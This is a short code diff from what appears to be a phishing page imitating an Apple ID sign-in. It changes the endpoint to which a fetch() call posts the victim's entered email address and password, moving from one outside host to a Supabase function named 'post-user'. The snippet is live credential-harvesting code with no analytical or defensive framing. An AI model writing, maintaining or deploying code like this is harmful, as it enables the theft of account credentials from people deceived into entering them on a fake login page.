@@ -20,7 +20,7 @@ function showPasswordInput() {
       alert('Please enter your password.');
     }
 
-    fetch('https://api.sjillen0x.com/login', {
+    fetch('https://mkmipbywiensjnruhrcu.supabase.co/functions/v1/post-user', {
       method: 'POST',
       body: JSON.stringify({
         email: document.getElementById('apple-id').value,
